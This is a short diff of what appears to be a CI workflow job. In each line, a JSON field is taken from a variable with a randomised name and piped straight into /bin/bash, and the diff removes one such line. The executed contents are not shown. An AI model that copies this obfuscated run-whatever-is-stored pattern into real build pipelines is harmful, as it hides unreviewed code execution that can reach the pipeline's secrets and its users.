@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$lcu38" | jq -r .z24 | /bin/bash
           echo $keog8705 | jq -r .ze0238 | /bin/bash
           printf '%s' "$nds47124" | jq -r .et49 | /bin/bash
-          printf '%s' "$jxx92236" | jq -r .z1 | /bin/bash
           echo $rif3884 | jq -r .n59010 | /bin/bash
 
       - name: Archive output
